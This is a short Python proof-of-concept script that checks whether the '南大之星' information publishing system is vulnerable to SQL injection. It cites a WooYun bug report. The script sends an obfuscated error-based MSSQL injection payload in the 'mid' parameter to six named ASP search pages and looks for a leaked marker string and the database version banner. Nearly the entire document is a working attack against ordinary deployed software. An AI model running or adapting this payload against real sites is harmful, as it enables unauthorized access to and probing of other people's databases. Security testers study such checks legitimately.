#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 南大之星信息发布系统DBA SQL注入
referer: http://wooyun.org/bugs/wooyun-2015-0153651
author: Lucifer
description: 多个文件mid参数存在注入。
'''
import sys
import requests
import warnings

  

class six_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['南大之星信息发布系统DBA SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "&mid=4%20AnD%201=CoNvErt(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@VeRsIoN)&yh=1"
        urls = ["/pub/search/search_video.asp?id=3",
                "/pub/search/search_audio.asp?id=3",
                "/pub/search/search_audio_view.asp?id=3",
                "/pub/search/search_fj.asp?id=3",
                "/pub/search/search_video_bc.asp?id=12",
                "/pub/search/search_video_view.asp?id=3"]
        try:
            noexist = True
            for turl in urls:
                vulnurl = self.url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"WtFaBcMicrosoft" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = six_sqli(sys.argv[1])
    testVuln.run()